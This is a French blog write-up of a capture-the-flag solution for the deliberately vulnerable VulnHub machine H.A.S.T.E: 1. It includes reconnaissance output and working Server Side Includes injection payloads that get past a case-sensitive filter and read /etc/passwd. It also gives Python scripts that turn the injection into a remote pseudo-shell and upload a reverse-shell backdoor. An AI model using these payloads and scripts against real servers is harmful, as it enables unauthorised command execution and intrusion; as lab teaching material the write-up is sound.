# Solution du CTF H.A.S.T.E: 1 de VulnHub

A short time ago...
-------------------

Après [le précédent CTF](http://devloop.users.sourceforge.net/index.php?article134/solution-du-ctf-lazysysadmin-1-de-vulnhub) qui m'avait laissé sur ma fin, j'en ai cherché un qui serait plus *consistent* et je me suis tourné vers le *HASTE* dont la difficulté était notée moyenne.  

[H.A.S.T.E: 1](https://www.vulnhub.com/entry/haste-1,203/) est une VM créée par [f1re\_w1re](https://securityshards.wordpress.com/).  

L'image est au format VMWare, je suis passé par *VBoxManage* pour la convertir au format VirtualBox.  

Le synopsis est le suivant :  

> This vulnerable-by-design box depicts a hacking company known as H.A.S.T.E, or Hackers Attack Specific Targets Expeditiously, capable of bringing down any domains on their hit list.  
> 
>   
> 
> I would like to classify this challenge with medium difficulty, requiring some trial and error before a successful takeover can be attained.

... in a VM from VulnHub
------------------------

```plain
Nmap scan report for 192.168.1.36
Host is up (0.00092s latency).
Not shown: 65501 closed ports, 33 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/spukcab
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: H.A.S.T.E
MAC Address: 08:00:27:8A:F0:6C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Network Distance: 1 hop
```

Arrivé sur le site web on a le texte suivant suivi d'un formulaire de contact :  

> Welcome, adventurer,  
> 
>   
> 
> To our top secret website in the dark web. If you are reading this is because someone has recommended our services to you. We are known as H.A.S.T.E, or Hackers Attack Specific Targets Expiditiously, we specialize in taking down any site at for 2.37 BTC. We are on a mission to rid the electronic world from corporate sites that are instated to take advantage of those who do not have a voice. We do not ask any questions when payment is made.   
> 
>   
> 
> If you are affiliated with law enforcement, please don't waste your time. You will not stop us in letting our clients take their vengeance against entities that have oppressed them. We will purge and mercilessly rampage through any sites on our list.  
> 
>   
> 
> Please fill out the form below to place this website in our hit list.

```html

         <form method="post" action="receipt.php">
          <fieldset>
            <legend>Attack Form:</legend>
            <input class="btmspace-15" type="text" value="" placeholder="Target" name="xxx">
            <input class="btmspace-15" type="text" value="" placeholder="Feedback" name="feedback">
            <button type="submit" value="submit">Submit</button>
          </fieldset>
        </form>
```

Dans le dossier *spukcab* indiqué dans le *robots.txt* on trouve deux fichiers : *index.bak* et *oldconfig.bak*. Le dernier contient une configuration Apache qui pourrait nous être utile :  

```plain
<VirtualHost *:80>
ServerAdmin webmaster@convert.me
ServerName convert.me
ServerAlias www.convert.me

DirectoryIndex index.php
DocumentRoot /var/www/html/convert.me/public_html
LogLevel warn
ErrorLog /var/www/html/convert.me/log/error.log
CustomLog /var/www/html/convert.me/log/access.log combined

<Directory /var/www/html/convert.me/public_html>
Options Indexes FollowSymlinks MultiViews
AllowOverride None
Order allow,deny
allow from all
</Directory>

</VirtualHost>
```

Après avoir lancé une première fois [Wapiti](http://wapiti.sourceforge.net/) sans résultats et testé quelques injections de commande et SQLi sur le formulaire, je lance un buster afin de trouver d'autres dossiers intéressants.  

```plain
  `==\. dvbuster v1.0 ./=='
      ¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
20469 lines to process.
as many requests to send.
Using 4 processes...
Server banner: Apache/2.4.18 (Ubuntu)

Starting buster processes...
http://192.168.1.36/.htpasswd/ - HTTP 403 (297 bytes, plain)
http://192.168.1.36/.htaccess/ - HTTP 403 (297 bytes, plain)
http://192.168.1.36/cgi-bin/ - HTTP 403 (295 bytes, plain)
http://192.168.1.36/icons/ - HTTP 403 (293 bytes, plain)
http://192.168.1.36/images/ - HTTP 200 (486 bytes, gzip) - Directory listing found
http://192.168.1.36/layout/ - HTTP 200 (506 bytes, gzip) - Directory listing found
http://192.168.1.36/pages/ - HTTP 200 (554 bytes, gzip) - Directory listing found
http://192.168.1.36/server-status/ - HTTP 403 (301 bytes, plain)
100% - DONE
Duration: 0:00:12.231941
```

Le listing de la plupart des dossiers est rendu possible par le fait que l'admin avait placé des *index.html* mais que le *DirectoryIndex* utilise *index.php* (voir fichier de config plus haut).  

Mais ces nouveaux dossiers ne nous apportent rien de plus :(   

Est-ce que l'ancien site tourne toujours ? Pour le savoir il nous suffit de forger l'entête Host (ou ajouter une entrée dans son */etc/hosts*)  

```bash
curl -H "Host: convert.me" http://192.168.1.36/
```

La commande nous retourne le même site, la piste n'est pas bonne.  

Le formulaire *receipt.php* nous redirige après la soumission des données vers *receipt.**shtml***. On va fouiller de ce côté :  

```plain
http://192.168.1.36/index.shtml - HTTP 200 (35 bytes, plain)
http://192.168.1.36/receipt.shtml - HTTP 200 (761 bytes, gzip)
http://192.168.1.36/ssi.shtml - HTTP 200 (296 bytes, gzip)
```

Voilà qui est plus intéressant ! Le fichier *index.shtml* comporte du SSI (*Server Side Includes*) malformé, un indice important qui nous indique de tester de [l'injection de SSI](https://www.owasp.org/index.php/Testing_for_SSI_Injection_(OTG-INPVAL-009)) :  

```html
<--#exec cmd="cat /etc/passwd" -->
```

Ici il manque un point d'exclamation pour que le SSI puisse fonctionner. Le fichier *ssi.shtml* semble quand à lui fonctionner. Un message d'erreur donne le même indice sur les SSI :  

```plain
Hello total 16
-rw------- 1 root root    0 Oct 28 09:04 002f859fefa6d
drwxrwxrwt 2 root root 4096 Oct 28 08:58 VMwareDnD
drwx------ 3 root root 4096 Oct 28 08:59 systemd-private-cd3beb192ebf435d8efd903c82f6d0cc-colord.service-QvCs79
drwx------ 3 root root 4096 Oct 28 08:59 systemd-private-cd3beb192ebf435d8efd903c82f6d0cc-rtkit-daemon.service-gUdddV
drwx------ 3 root root 4096 Oct 28 08:58 systemd-private-cd3beb192ebf435d8efd903c82f6d0cc-systemd-timesyncd.service-7j1dQm
 [an error occurred while processing this directive],
Your IP address is: 192.168.1.6
```

On peut trouver des informations sur les SSI [ici](http://httpd.apache.org/docs/current/howto/ssi.html) et avoir des noms de variables Apache utiles [ici](http://httpd.apache.org/docs/current/expr.html).

On voit que le champ target du formulaire est vulnérable, notamment avec les exemples suivants :  

```html
<!--#flastmod file="ssi.shtml" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="SCRIPT_FILENAME" -->
```

La dernière ligne nous retourne le path */var/www/html/convert.me/public\_html/receipt.shtml*  

En revanche les directives qui nous intéressent vraiment ne marchent pas :  

```html
<!--#include virtual="ssi.shtml"-->
```

mais après un peu d'acharnement on découvre que la suivante fonctionne :  

```html
<!--#Include virtual="ssi.shtml"-->
```

De même exec en minuscule échoue :  

```html
<!--#exec cmd="ls" -->
```

mais tout en majuscules cela fonctionne :  

```html
<!--#EXEC cmd="ls" --> 
```

![SSI injenction result](https://raw.githubusercontent.com/devl00p/blog/master/images/hastevm.png)

A Python was good
-----------------

On a donc de l'exécution de commande mais pas très sexy. L'étape suivante est d'uploader une backdoor digne de ce nom sur le serveur, malheureusement *curl* n'est pas présent et *wget* ne semblait pas aboutir (peut être liée à ma configuration cependant...)  

Pour m'aider j'ai écrit un pseudo-shell qui communique avec le formulaire :  

```python
import requests
from bs4 import BeautifulSoup
from base64 import b64decode

sess = requests.session()

while True:
    cmd = input("$ ").strip()
    if cmd.lower() == "exit":
        break
    params = {"xxx": "", "feedback": '<pre><!--#EXEC cmd="{}|base64" --></pre>'.format(cmd)}
    response = requests.post("http://192.168.1.36/receipt.php", data=params)
    soup = BeautifulSoup(response.text, "lxml")
    encoded = soup.find("pre").get_text(strip=True, separator='')
    print(b64decode(encoded).decode())
    print('')
```

La récupération de certaines données ne semblait pas fonctionner, c'est pour cela que je passe par une étape d'encodage puis décodage base64.  

Dans le fichier */etc/passwd* on remarque un utilisateur *starfire*.  

```plain
starfire:x:1000:1000:admin,,,:/home/starfire:/bin/bash
```

Le kernel ne semble pas vulnérable à DirtyC0w :'(   

```plain
Linux ConverterPlus 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:13 UTC 2017 i686 i686 i686 GNU/Linux
```

Pour les problèmes d'upload j'ai créé un script qui converti un fichier local en base64 et écrit sur le serveur ligne par ligne par *echo*. Il suffit après d'utiliser *base64 -d* pour récupérer le fichier uploadé.  

```python
import requests
import os
import sys

try:
    os.unlink("/tmp/temp64.txt")
except FileNotFoundError:
    pass

os.system("base64 '{}' > /tmp/temp64.txt".format(sys.argv[1]))

params = {"xxx": "", "feedback": '<pre><!--#EXEC cmd="rm out" --></pre>'}
response = requests.post("http://192.168.1.36/receipt.php", data=params)

with open("/tmp/temp64.txt") as fd:
    for line in fd:
        line = line.strip()
        if not line:
            break
        params = {"xxx": "", "feedback": '<pre><!--#EXEC cmd="echo {} >> out" --></pre>'.format(line)}
        response = requests.post("http://192.168.1.36/receipt.php", data=params)
```

Avec ça j'ai pu placer et exécuter une backdoor MSF (x86 reverse shell)  

Pour les curieux voici le fonctionnement de *receipt.php* :   

```php
<?php
$target = $_POST["xxx"];
$feedback = $_POST["feedback"];
$target = str_replace("<", "", $target);
$target = str_replace(">", "", $target);
$feedback = str_replace("exec", "", $feedback);
$feedback = str_replace("Exec", "", $feedback);
$feedback = str_replace("include", "", $feedback);
$feedback = str_replace("InClUdE", "", $feedback);
$fileopen = fopen("receipt.shtml", "w");
// --- snip ---
fwrite($fileopen, $content);
fclose($fileopen);
header("Location:receipt.shtml");

// Thank you, your feedback is very important to us.
?>
```

That's all folks
----------------

Le challenge laissait supposer que l'on avait affaire à un boot-2-root.  

Mais j'ai fouillé en long, en large, en travers sans aucun résultat. Épluché les entrées cron, cherché des binaires setuid, des fichiers word-writable pour root et *starfire*, cherché un mot de passe quelconque sur le système... sans succès.  

Dans les commentaires liés à l'annonce de la VM l'auteur laisse entendre [sur son blog](https://securityshards.wordpress.com/2017/09/13/new-h-a-s-t-e-hacking-challenge/) que l'on peut avoir les privilèges root mais plus tard il indique que ça ne fait pas partie du challenge... Plus de clarifications sur le sujet aurait été bénéfiques :(

*Published October 29 2017 at 11:01*